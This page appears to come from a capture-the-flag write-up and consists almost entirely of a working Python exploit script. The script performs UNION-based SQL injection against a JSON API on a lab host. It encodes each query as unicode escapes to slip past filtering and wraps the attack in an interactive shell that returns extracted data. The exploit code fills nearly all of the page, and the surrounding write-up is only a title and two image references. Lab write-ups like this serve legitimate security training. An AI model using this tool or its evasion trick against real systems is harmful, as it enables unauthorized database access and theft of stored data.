# SQLi Shell

![Request](../../.gitbook/assets/image%20%28108%29.png)

```text
import requests
import json
import cmd

url = "http://10.10.10.179/api/getColleagues"
header = {"Content-Type":"application/json;charset=utf-8"}

def gen_payload(query):
    payload = ""
    for char in query:
        payload += r"\u{:04x}".format(ord(char))
    return payload

class exploit(cmd.Cmd):
    prompt = "PleaseSub > "

    def default(self, line):
        # simply create a payload and print it!
        payload = "a' union select 1,2,3," + line + ",5-- -"

        print(payload)


    def do_sqli(self, line):

        # First create the ASCII payload
        payload = "a' union select 1,2,3," + line + ",5-- -"

        # Convert complete data to unicode encoding
        payload = gen_payload(payload)

        # Inject the payload to request
        data = '{"name":"' + payload  + '"}'
        r = requests.post(url, data=data, headers=header)

        # Print the response
        r = r.text
        r = json.loads(r)
        response = r[0]["email"]
        print(response)

exploit().cmdloop()

```

![Working Proof](../../.gitbook/assets/image%20%28110%29.png)

